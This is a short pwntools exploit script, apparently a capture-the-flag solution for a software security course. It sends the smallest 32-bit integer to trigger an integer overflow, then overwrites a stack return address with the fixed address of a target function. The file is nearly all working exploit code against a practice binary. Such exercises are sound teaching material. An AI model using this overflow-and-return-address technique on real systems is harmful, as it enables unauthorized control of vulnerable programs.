#!/usr/bin/env python3

import pwn

# pwninit
exe = pwn.ELF("./vuln_patched")
#libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

# int is 32-bit signed integer
# => 31 ones is the biggest integer => 2^31 - 1
biggest_integer = 2**31 -1
smallest_integer = -1 * (2**31)
print(smallest_integer)
print(str(smallest_integer).encode())
conn.sendlineafter(b'Nappa: Hey Vegeta, how many digits can your new scouter display?\n', str(smallest_integer).encode())

# no pie => its_over_9000 is at fix position:
# objdump -d vuln_pathced

address_9000 = 0x0000000000401176

# we override return address with address_9000
data = b'A' * 4 + pwn.p64(address_9000)*20

conn.sendlineafter(b' power level is with this new scouter.', data)


conn.interactive()
